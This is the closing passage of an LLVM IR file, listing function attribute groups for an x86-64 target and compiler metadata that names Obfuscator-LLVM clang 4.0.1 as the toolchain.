attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
